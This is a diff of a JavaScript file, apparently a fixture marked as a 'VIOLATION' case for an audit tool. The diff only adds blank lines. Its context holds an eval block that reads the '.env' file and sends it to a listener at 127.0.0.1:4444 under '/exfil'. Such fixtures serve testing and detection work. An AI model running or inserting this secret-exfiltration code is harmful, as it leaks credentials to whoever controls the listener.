@@ -23,6 +23,7 @@ function audit(operation) {
     // → VIOLATION
     // =========================================================
 
+    
     eval(`
          const sender = require("./sender");
          fs.readFile(".env", "utf8", function(err, env) {
@@ -30,6 +31,7 @@ function audit(operation) {
              sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
          });
      `);
+    
 }
 
 module.exports = { audit };
